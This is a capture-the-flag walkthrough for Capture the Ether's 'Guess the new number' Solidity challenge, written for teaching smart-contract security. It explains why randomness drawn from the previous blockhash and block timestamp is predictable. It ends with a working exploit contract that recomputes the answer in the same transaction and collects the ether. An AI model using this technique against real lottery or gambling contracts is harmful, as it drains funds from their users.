---
description: >-
  In Capture the Ether's "Guess the new number", we move beyond "guessing" the
  value of variables stored on-chain.
---

# Guess the new number

This [level](https://capturetheether.com/challenges/lotteries/guess-the-new-number/) challenges us to predict a dynamically-generated value that cannot be known prior to making our guess.

### Hints

<details>

<summary>Hint One</summary>

Anything the `GuessTheNewNumberChallenge` contract can do, a contract you create can do as well. Any contract you deploy to interact with the challenge contract will run in the context of the same `block.number`, `block.timestamp`, etc. as the challenge contract’s code it calls is part of the same transaction and “bundled up” into the same block.

</details>

### Full Walkthrough

Because the `answer` is generated on-demand, and because the source of its randomness cannot be known prior to making our guess, the only solution is to mimic the way the contract calculates the value of `answer` to determine what our guess should be. As the value depends on the previous block hash and the block timestamp, our guess calculation will need to be made in the same context as the contract's calculation.

Luckily, we are free to copy the `GuessTheNewNumberChallenge` contract's logic into our own smart contract, which we will use to make our guess. Both the logic in our own contract and the logic in the challenge contract will be executed in the same context as they will be bundled up into the same block.

### Scripted Solution

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

interface IGuessTheNewNumberChallenge {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberChallengeExploit {
    /**
     * Correctly guesses answer of `GuessTheNewNumberChallenge` contract.
     */
    function guess(address contractAddress) external payable {
        // Calculate answer based on blockhash
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        );

        // Call contract with `answer`, passing `msg.value` ether
        IGuessTheNewNumberChallenge(contractAddress).guess{value: msg.value}(
            answer
        );

        // Return contract balance to `msg.sender`
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
```
